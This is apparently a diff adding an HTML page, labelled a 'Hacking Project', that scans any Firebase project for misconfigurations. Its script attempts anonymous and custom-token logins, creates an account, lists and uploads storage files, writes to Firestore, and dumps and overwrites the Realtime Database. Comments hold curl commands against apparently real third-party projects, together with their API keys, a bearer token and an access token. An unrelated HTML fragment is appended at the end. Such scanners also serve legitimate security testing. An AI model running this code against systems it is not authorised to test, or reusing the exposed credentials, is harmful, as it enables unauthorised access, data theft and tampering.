@@ -1,0 +1,593 @@
+<html>
+<head>
+    <title> Firebase Test </title>
+</head>
+<body>
+<script src="https://www.gstatic.com/firebasejs/7.14.4/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/7.14.4/firebase-analytics.js"></script>
+<script src="https://www.gstatic.com/firebasejs/7.14.4/firebase-auth.js"></script>
+<script src="https://www.gstatic.com/firebasejs/7.14.4/firebase-firestore.js"></script>
+<script src="https://www.gstatic.com/firebasejs/7.14.4/firebase-functions.js"></script>
+<script src="https://www.gstatic.com/firebasejs/7.14.4/firebase-messaging.js"></script>
+<script src="https://www.gstatic.com/firebasejs/7.14.4/firebase-storage.js"></script>
+<script src="https://www.gstatic.com/firebasejs/7.14.4/firebase-performance.js"></script>
+<script src="https://www.gstatic.com/firebasejs/7.14.4/firebase-database.js"></script>
+<script src="https://www.gstatic.com/firebasejs/7.14.4/firebase-remote-config.js"></script>
+
+
+<div>
+
+    <div>
+        <font style="font-weight: bolder;font-size: 1.5rem">Setup:</font>
+        <br/>
+        <label>ProjectID: </label>
+        <input id="projectId" type="text" value="test-479e4"/>
+        <label style="margin-left: 20px">ApiKey: </label>
+        <input id="apiKey" style="width: 40%" type="text" value="AIzaSyDhVz11SelnSNwINRESWO2mWqeuoH8lV1c"/>
+        <button onclick="run()">submit</button>
+    </div>
+
+    <hr/>
+    <div>
+        <font style="font-weight: bolder;font-size: 1.5rem">Config:</font>
+        <br/>
+        <textarea cols="100" rows="10" disabled style="overflow:auto;resize:none" id="configValue"></textarea>
+    </div>
+
+    <hr/>
+    <div>
+        <font style="font-weight: bolder;font-size: 1.5rem">Login testing:</font>
+        <br/>
+        <font style="font-size: 1.2rem">Anonymous Login Status: </font>
+        <font id="anonymousStatus" style="font-weight: bolder;font-size: 1rem">N/A</font>
+        <br/>
+        <font style="font-size: 1.2rem">Signin Link To Email Login Status: </font>
+        <font id="linkToEmailStatus" style="font-weight: bolder;font-size: 1rem">N/A</font>
+        <br/>
+        <font style="font-size: 1.2rem">Create Account to Login Status: </font>
+        <font id="createAccountStatus" style="font-weight: bolder;font-size: 1rem">N/A</font>
+        <br/>
+        <font style="font-size: 1.2rem">Token Login Status: </font>
+        <font id="tokenStatus" style="font-weight: bolder;font-size: 1rem">N/A</font>
+        <br/>
+        <font style="font-size: 1.2rem">Normal Login Status: </font>
+        <font id="normalLoginStatus" style="font-weight: bolder;font-size: 1rem">N/A</font>
+
+    </div>
+
+    <hr/>
+
+    <div>
+        <font style="font-weight: bolder;font-size: 1.5rem">Firebase Storage:</font>
+        <br/>
+        <font style="font-size: 1.2rem">Upload Status: </font>
+        <font id="storageEditStatus" style="font-weight: bolder;font-size: 1rem">N/A</font>
+        <br/>
+        <font style="font-size: 1.2rem">View Status: </font>
+        <font id="storageViewStatus" style="font-weight: bolder;font-size: 1rem">N/A</font>
+
+    </div>
+
+    <hr/>
+
+    <div>
+        <font style="font-weight: bolder;font-size: 1.5rem">Firebase Firestore:</font>
+        <br/>
+        <font style="font-size: 1.2rem">Edit Status: </font>
+        <font id="firestoreEditStatus" style="font-weight: bolder;font-size: 1rem">N/A</font>
+        <br/>
+        <font style="font-size: 1.2rem">View Status: </font>
+        <font id="firestoreViewStatus" style="font-weight: bolder;font-size: 1rem">N/A</font>
+
+    </div>
+
+    <hr/>
+
+    <div>
+        <font style="font-weight: bolder;font-size: 1.5rem">Firebase Realtime Database:</font>
+        <br/>
+        <font style="font-size: 1.2rem">Write Permission: </font>
+        <font id="dbEditStatus" style="font-weight: bolder;font-size: 1rem">N/A</font>
+        <br/>
+        <font style="font-size: 1.2rem">Read Permission: </font>
+        <font id="dbViewStatus" style="font-weight: bolder;font-size: 1rem">N/A</font>
+        <br/>
+        <textarea cols="100" rows="4" disabled style="overflow:auto;resize:none" id="dbValue"></textarea>
+
+    </div>
+
+
+</div>
+
+
+<script>
+
+
+    //Hacking Project
+
+
+    // curl 'https://test-9a75d.firebaseio.com/.settings/rules.json?access_token=tSLEIWYqsByUJf7Qe4S2MbxpHv0O2fWBImadcfp4'
+
+    // var firebaseConfig = {
+    //     apiKey: "",
+    //     authDomain: "",
+    //     databaseURL: "",
+    //     projectId: "",
+    //     storageBucket: "",
+    //     messagingSenderId: "",
+    //     appId: "",
+    //     measurementId: ""
+    // };
+
+
+    // //Test project
+    // var project_id = 'test-479e4';
+    // var api_key = 'AIzaSyDhVz11SelnSNwINRESWO2mWqeuoH8lV1c';
+	
+	
+	
+    function run() {
+
+        var project_id_value = document.getElementById("projectId").value;
+        var api_key_value = document.getElementById("apiKey").value;
+        window.location.href = window.location.protocol + '//' +
+            window.location.hostname + window.location.pathname +
+            "?projectId=" + project_id_value +
+            "&apiKey=" + api_key_value;
+    }
+
+    var url_string = window.location.href; //window.location.href
+    var url = new URL(url_string);
+
+    var project_id = url.searchParams.get("projectId");
+    var api_key = url.searchParams.get("apiKey");
+	
+	
+	document.getElementById("projectId").value = project_id;
+	document.getElementById("apiKey").value = api_key;
+
+    var firebaseConfig = {
+        apiKey: api_key,
+        authDomain: project_id + ".firebaseapp.com",
+        databaseURL: "https://" + project_id + ".firebaseio.com",
+        projectId: project_id,
+        storageBucket: project_id + ".appspot.com",
+        // appId: "1:108552699902:web:8377e101c0cb2fbec84aaf",
+        appId: "111",
+        // measurementId: "G-G7SE48QM4W"
+        measurementId: "111222"
+    };
+
+
+    var myJSON = JSON.stringify(firebaseConfig, null, "\t");
+
+
+    document.getElementById("configValue").value = myJSON;
+
+    // var firebaseConfig = {
+    //     apiKey: "AIzaSyCNbvHhF6A5OIKsSEU__0JP95Igskx8CBQ",
+    //     authDomain: "hsc-mobile-6e757.firebaseapp.com",
+    //     databaseURL: "https://hsc-mobile-6e757.firebaseio.com",
+    //     projectId: "hsc-mobile-6e757",
+    //     storageBucket: "hsc-mobile-6e757.appspot.com",
+    //     // appId: "1:108552699902:web:8377e101c0cb2fbec84aaf",
+    //     appId: "123",
+    //     // measurementId: "G-G7SE48QM4W"
+    //     measurementId: "123123"
+    // };
+
+    var defaultProject = firebase.initializeApp(firebaseConfig);
+
+    /*
+        Test FIREBASE AUTHENTICATION
+        https://firebase.google.com/docs/auth/web/start
+
+        Password authentication search: signInWithEmailAndPassword
+        Create account search: createUserWithEmailAndPassword
+        Link Email authentication search: sendSignInLinkToEmail
+        Anonymous authentication: signInAnonymously
+        Sign in with customer token: signInWithCustomToken
+
+        https://www.googleapis.com/identitytoolkit/v3/relyingparty/getProjectConfig?key=AIzaSyDopF0A5QFr-Vff-TX_mvECa0-xCBeuklY
+        {
+          "projectId": "624372672798",
+          "authorizedDomains": [
+            "localhost",
+            "test02-37a07.firebaseapp.com",
+            "test02-37a07.web.app"
+          ]
+        }
+        Test case:
+        1. Anonymous login
+        2. Send SignIn Link to Email
+        3. create User With Email And Password
+        4. Sign in with custom token
+    */
+
+    var auth = firebase.auth();
+    auth.signInAnonymously().then(function (token) {
+        console.log("[FirebaseAuthentication] Anonymous Login *** BUG ***");
+        console.log("Success Login as Anonymous", token);
+
+        document.getElementById("anonymousStatus").innerHTML =
+            '<font style="font-weight: bolder" color="red">BUG!!! Token: ' + token + '</font>';
+
+
+    }).catch(function (err) {
+        console.log("[FirebaseAuthentication] Anonymous Login");
+        console.log("Anonymous Login Error:", err);
+
+        document.getElementById("anonymousStatus").innerHTML =
+            '<font style="font-weight: bolder" color="green">Not Vulnerable!!! Error: ' + err + '</font>';
+    });
+    auth.sendSignInLinkToEmail("toannc123@gmail.com", {
+        url: firebaseConfig.authDomain,
+        handleCodeInApp: true
+    }).then(function (token) {
+        console.log("[FirebaseAuthentication] Send SignIn Link To Email *** BUG ***");
+        console.log("Send SignIn Link To Email Success", token);
+
+        document.getElementById("linkToEmailStatus").innerHTML =
+            '<font style="font-weight: bolder" color="red">BUG!!! Token: ' + token + '</font>';
+
+    }).catch(function (err) {
+        console.log("[FirebaseAuthentication] Send SignIn Link To Email");
+        console.log("Send SignIn Link To Email Error", err);
+
+        document.getElementById("linkToEmailStatus").innerHTML =
+            '<font style="font-weight: bolder" color="green">Not Vulnerable!!! Error: ' + err + '</font>';
+    });
+    auth.createUserWithEmailAndPassword("toannc123@gmail.com", "test123456").then(function (token) {
+        console.log("[FirebaseAuthentication] create User With Email And Password *** BUG ***");
+        console.log("create User With Email And Password Success", token);
+
+        document.getElementById("createAccountStatus").innerHTML =
+            '<font style="font-weight: bolder" color="red">BUG!!! Token: ' + token + '</font>';
+    }).catch(function (err) {
+        console.log("[FirebaseAuthentication] create User With Email And Password");
+        console.log("create User With Email And Password Error", err);
+
+        document.getElementById("createAccountStatus").innerHTML =
+            '<font style="font-weight: bolder" color="green">Not Vulnerable!!! Error: ' + err + '</font>';
+
+    });
+    //auth.signInWithCustomToken("token").then(function (token) {
+    auth.signInWithCustomToken("ede41daf-1781-46fa-8783-043842b20ef6").then(function (token) {
+        console.log("[FirebaseAuthentication] sign In With Custom Token *** BUG ***");
+        console.log("sign In With Custom Token Success", token);
+
+        document.getElementById("tokenStatus").innerHTML =
+            '<font style="font-weight: bolder" color="red">BUG!!! Token: ' + token + '</font>';
+
+    }).catch(function (err) {
+        console.log("[FirebaseAuthentication] sign In With Custom Token");
+        console.log("sign In With Custom Token Error", err);
+
+        document.getElementById("tokenStatus").innerHTML =
+            '<font style="font-weight: bolder" color="green">Not Vulnerable!!! Error: ' + err + '</font>';
+
+    });
+    auth.signInWithEmailAndPassword("toannc123@gmail.com", "test123456").then(function (token) {
+        console.log("[FirebaseAuthentication] sign In With Username and Password *** BUG ***");
+        console.log("sign In With Username and Password Success", token);
+
+        document.getElementById("normalLoginStatus").innerHTML =
+            '<font style="font-weight: bolder" color="red">BUG!!! Token: ' + token + '</font>';
+
+    }).catch(function (err) {
+        console.log("[FirebaseAuthentication] sign In With Username and Password");
+        console.log("sign In With Username and Password Error", err);
+
+        document.getElementById("normalLoginStatus").innerHTML =
+            '<font style="font-weight: bolder" color="green">Not Vulnerable!!! Error: ' + err + '</font>';
+
+    });
+
+    // firebase.analytics();
+
+    /*
+        Testing FIRBASE STORAGE:
+        https://firebase.google.com/docs/storage/web/start
+        Find child of storage in Javascript/Android then try to get/update/delete it
+        search: ref
+        search: storage
+
+        Test case:
+        1. Unauthenticated List data
+        2. Unauthenticated Upload file
+        3. Unauthenticated Get URL download for specific files.
+
+        curl 'https://firebasestorage.googleapis.com/v0/b/shein-3876.appspot.com/o?prefix=&delimiter=%2F' \
+          -H 'authority: firebasestorage.googleapis.com' \
+          -H 'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Mobile Safari/537.36' \
+          -H 'x-firebase-gmpid: 1:624372672798:web:b04b11ffdcc681abcc810f' \
+          -H 'x-firebase-storage-version: webjs/7.14.4' \
+          -H 'authorization: Firebase eyJhbGciOiJSUzI1NiIsImtpZCI6ImFmMDg2ZmE4Y2Q5NDFlMDY3ZTc3NzNkYmIwNDcxMjAxMTBlMDA1NGEiLCJ0eXAiOiJKV1QifQ.eyJwcm92aWRlcl9pZCI6ImFub255bW91cyIsImlzcyI6Imh0dHBzOi8vc2VjdXJldG9rZW4uZ29vZ2xlLmNvbS90ZXN0LTlhNzVkIiwiYXVkIjoidGVzdC05YTc1ZCIsImF1dGhfdGltZSI6MTU5NzIyOTYzOCwidXNlcl9pZCI6IjRzbTNvanA0Q1ZUN3E0Q2oxdzR0d3RoU3E3djIiLCJzdWIiOiI0c20zb2pwNENWVDdxNENqMXc0dHd0aFNxN3YyIiwiaWF0IjoxNTk3MjQyNjQyLCJleHAiOjE1OTcyNDYyNDIsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnt9LCJzaWduX2luX3Byb3ZpZGVyIjoiYW5vbnltb3VzIn19.MED9E0-UPFzAEDPpeLZvAj0MSMirvEGzlwHO63EP94CbNbMrjdEqvKufVDxEuGhZw8gYb-46uF4mH5vv_zIIPUMIvnEPJCR31uXKdYBO8Wzyg9vJ2P5NLmqxnftXhsy_jdpgaSF7CBE6PSHa28POKn9olgV7fn4uCYjEfnfA-qnOsQ5OPwMw1HH38poeoN2--IyGRjxuA_o6e7uootz58M3xRHRNM_beScfR8m-ninwtnw4WTZUWEBn9B_GmqfKy8tDjzUG55Nl9SFKXk-mxeRI-bSsQ_yPJfM_wVVu1yLaH0orzI7QRngJsOI_wH7MbFE45yDTd9tXRZXFrSp95Qg' \
+          -H 'accept: */
+    /*' \
+                      -H 'origin: null' \
+                      -H 'x-client-data: CI+2yQEIpLbJAQjEtskBCKmdygEIhrXKAQiYtcoBCIq/ygEI58bKAQiMx8oBCOfIygEI6cjKAQi0y8oBGPC/ygE=' \
+                      -H 'sec-fetch-site: cross-site' \
+                      -H 'sec-fetch-mode: cors' \
+                      -H 'sec-fetch-dest: empty' \
+                      -H 'accept-language: en-US,en;q=0.9' \
+                      --compressed
+                                  */
+
+
+
+
+    // Default is firebase storage allow list all with authenticated users. rules_version = '2';
+    var st = defaultProject.storage();
+    var st_ref = st.ref();
+
+    var folder = "/";
+    st_ref.child(folder).listAll().then(function (res) {
+        console.log("[FirebaseStorage] Test Listing all files in directory *** BUG ***");
+        console.log("[+] ListAll: ", res);
+
+
+        document.getElementById("storageViewStatus").innerHTML =
+            '<font style="font-weight: bolder" color="red">BUG!!!</font><br/>List for folder "' + folder + '":';
+
+        var items = '';
+        if (res.items.length > 0) {
+            for (var i = 0; i < res.items.length; i++) {
+                var downloadItem = folder + "/" + res.items[i].name;
+                items = items +
+                    '<li><a href=\'javascript:downloadFile("' +
+                    downloadItem +
+                    '")\'>[File] ' + res.items[i].name + '</a></li>';
+
+
+            }
+        }
+
+        var folders = '';
+        if (res.prefixes.length > 0) {
+            for (var i = 0; i < res.prefixes.length; i++) {
+                folders = folders + '<li>[Folder] ' + res.prefixes[i].name + '</li>';
+            }
+        }
+        document.getElementById("storageViewStatus").innerHTML += items + folders;
+
+    }).catch(function (err) {
+        console.log("[FirebaseStorage] Test Listing all files in directory");
+        console.log("[-] ListAll Error: ", err);
+
+        document.getElementById("storageViewStatus").innerHTML =
+            '<font style="font-weight: bolder" color="green">Not Vulnerable!!! Error: ' + err + '</font>';
+    });
+
+    // Default firebase storage does not allow unauthenticated user upload.
+    var file_to_upload = "/tl.txt";
+    st_ref = st.ref(file_to_upload);
+    var bytes = new Uint8Array([0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x2c, 0x20, 0x77, 0x6f, 0x72, 0x6c, 0x64, 0x21]);
+
+    st_ref.put(bytes).then(function (snapshot) {
+        console.log("[FirebaseStorage] Test Upload file *** BUG ***");
+        console.log('Uploaded an array!');
+
+        document.getElementById("storageEditStatus").innerHTML =
+            '<font style="font-weight: bolder" color="red">BUG!!!</font><br/>Uploaded file ' + file_to_upload;
+
+    }).catch(function (err) {
+        console.log("[FirebaseStorage] Test Upload file");
+        console.log("Uploadfile Error:", err);
+
+        document.getElementById("storageEditStatus").innerHTML =
+            '<font style="font-weight: bolder" color="green">Not Vulnerable!!! Error: ' + err + '</font>';
+    });
+	
+	
+	st_ref = st.ref(file_to_upload);
+
+	// Create a reference to the file to delete
+	//var desertRef = storageRef.child('images/desert.jpg');
+
+	// Delete the file
+	st_ref.delete().then(function() {
+		// File deleted successfully
+		console.log("[FirebaseStorage] Test Delete file *** BUG ***");
+	}).catch(function(error) {
+		// Uh-oh, an error occurred!
+		console.log("[FirebaseStorage] Test Delete file");
+        console.log("Delete file Error:", err);
+	});
+
+
+    function downloadFile(filePath) {
+
+        var st = defaultProject.storage();
+        var st_ref_temp = st.ref();
+
+
+        st_ref_temp = st.ref(filePath);
+        st_ref_temp.getDownloadURL().then(function (url) {
+            console.log("[FirebaseStorage] Test download file *** BUG ***");
+            console.log("URL Download file: ", url);
+            window.location.href = url;
+
+
+        }).catch(function (err) {
+            console.log("[FirebaseStorage] Test download file");
+            console.log("Get download url error", err);
+        });
+    }
+
+    // st_ref.getDownloadURL().then(function (url) {
+    //     console.log("[FirebaseStorage] Test download file *** BUG ***");
+    //     console.log("URL Download file: ", url);
+    // }).catch(function (err) {
+    //     console.log("[FirebaseStorage] Test download file");
+    //     console.log("Get download url error", err);
+    // });
+
+    /*
+        Testing FIREBASE FIRESTORE - collections
+        https://firebase.google.com/docs/firestore/quickstart
+        Find collection of firebase in Javascript/Android then try to get/update/delete it
+        search: collection("")
+        search: collection('')
+
+        Test case:
+        1. Unauthenticated Set data to a collection
+        2. Unauthenticated Read data to a collection
+
+        Data transfer via HTTP/2 request.
+    */
+
+    var firestore = firebase.firestore();
+    // https://shein-3876.firebaseio.com/test/testuser
+
+
+    // Valid options for source are 'server', 'cache', or
+    var getOptions = {
+        source: 'server'
+    };
+
+
+    firestore.collection("/test").doc("testuser").set({name: "Hello 123123 - h1"})
+        .then(function () {
+            console.log("[FirebaseCloudFireStore] Write data *** BUG ***");
+            console.log("success");
+
+            document.getElementById("firestoreEditStatus").innerHTML =
+                '<font style="font-weight: bolder" color="red">BUG!!!</font><br/>Written value to collection /test';
+        })
+        .catch(function (error) {
+            console.log("[FirebaseCloudFireStore] Write data");
+            console.log("Write data Error: ", error);
+
+            document.getElementById("firestoreEditStatus").innerHTML =
+                '<font style="font-weight: bolder" color="green">Not Vulnerable!!! Error: ' + err + '</font>';
+        });
+
+
+    firestore.collection("/testtt").doc("testuser").get(getOptions).then(function (res) {
+        console.log("[FirebaseCloudFireStore] Read data *** BUG ***");
+        console.log("[FirebaseCloudFireStore] URL: "
+            + 'https://content-firestore.googleapis.com/v1beta1/projects/' + firebaseConfig.projectId +
+            '/databases/(default)/documents/<collection_name>?key=' + firebaseConfig.apiKey
+        );
+        console.log("Collection data", res.data());
+
+        document.getElementById("firestoreViewStatus").innerHTML =
+            '<font style="font-weight: bolder" color="red">BUG!!!</font>' +
+            '<br/>Try to enum the collection_name by brute-forcing this API: ' +
+            'https://content-firestore.googleapis.com/v1beta1/projects/' +
+            firebaseConfig.projectId +
+            '/databases/(default)/documents/&lt;collection_name&gt;?key=' + firebaseConfig.apiKey;
+
+    }).catch(function (err) {
+        console.log("[FirebaseCloudFireStore] Read data");
+        console.log("Get Collection Data Error", err);
+
+        document.getElementById("firestoreViewStatus").innerHTML =
+            '<font style="font-weight: bolder" color="green">Not Vulnerable!!! Error: ' + err + '</font>';
+    });
+
+    // curl --url https://content-firestore.googleapis.com/v1beta1/projects/innofcmdev/databases/(default)/documents/test?key=AIzaSyDthV5krcQaURgrq7boDNwwkvFol-dWp8M
+    // curl --url 'https://content-firestore.googleapis.com/v1beta1/projects/shein-3876/databases/(default)/documents/test?key=AIzaSyAa8yy0GdcGPHdtD083HiGGx_S0vMPScDM'
+    // curl --url 'https://content-firestore.googleapis.com/v1beta1/projects/shein-3876/databases/(default)/documents/.?key=AIzaSyAa8yy0GdcGPHdtD083HiGGx_S0vMPScDM'
+    // curl --url 'https://content-firestore.googleapis.com/v1beta1/projects/<project_id>/databases/(default)/documents/<collection_name>?key=<API_Key>'
+
+
+    /*
+        Testing FIREBASE FUCNTION
+        https://firebase.google.com/docs/functions/callable
+        Find all functions deployed by the application
+        search: firebase.functions().httpsCallable
+    */
+
+    // var firebaseFuntion = firebase.functions()
+
+
+    /*
+        Test Firebase database
+        https://firebase.google.com/docs/database/web/start
+        search: database
+        search: ref
+        check result in websocket
+
+        Test case:
+        1. Unauthenticated read data
+        2. Unauthenticated write data
+    */
+
+    var database = firebase.database();
+    database.ref("/").once("value").then(function (snapshot) {
+        console.log("[FirebaseRealTimeDatabase] Read permission *** BUG ***");
+
+
+        var items = '';
+
+        var myJSON = JSON.stringify(snapshot, null, "\t");
+
+
+        // // To fix this bug Go to Realtime Database and set "read" to false
+        // snapshot.forEach(function (childSnapshot) {
+        //     var childKey = childSnapshot.key;
+        //     var childData = childSnapshot.val();
+        //     console.log("Key: " + childKey, ",Data: " + childData);
+        //     items = items + '<li>' + childKey + ' - ' + childData + '</li>';
+        //
+        // });
+
+
+        document.getElementById("dbViewStatus").innerHTML =
+            '<font style="font-weight: bolder" color="red">BUG!!!</font>';
+
+
+        document.getElementById("dbValue").value = myJSON;
+
+    }).catch(function (err) {
+        console.log("[FirebaseRealTimeDatabase] Read permission");
+        console.log("Read data error:", err);
+
+        document.getElementById("dbViewStatus").innerHTML =
+            '<font style="font-weight: bolder" color="green">Not Vulnerable!!! Error: ' + err + '</font>';
+
+    });
+
+    var db_name = "/xyz";
+    var db_value = "RealtimeDatabase";
+    database.ref(db_name).set({name: db_value}, function (err) {
+        // To fix this bug Go to Realtime Database and set "write" to false
+        if (err) {
+            console.log("[FirebaseRealTimeDatabase] Write permission");
+            console.log("Write data error: ", err);
+
+            document.getElementById("dbEditStatus").innerHTML =
+                '<font style="font-weight: bolder" color="green">Not Vulnerable!!! Error: ' + err + '</font>';
+
+
+        } else {
+            console.log("[FirebaseRealTimeDatabase] Write permission *** BUG ***");
+            console.log("Write data success");
+
+            document.getElementById("dbEditStatus").innerHTML =
+                '<font style="font-weight: bolder" color="red">BUG!!!</font><br/>Written value to db ' + db_name;
+
+
+        }
+    });
+
+
+</script>
+</body>
+</html>
+<html>
+<head>
+    <META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8">
+    <meta name="Robots" content="NOINDEX "/>
+</head>
+<body></body>
+<script type="text/javascript">
+    var gearPage = document.getElementById('GearPage');
+    if (null != gearPage) {
+        gearPage.parentNode.removeChild(gearPage);
+        document.title = "Error";
+    }
+</script>
+</html>
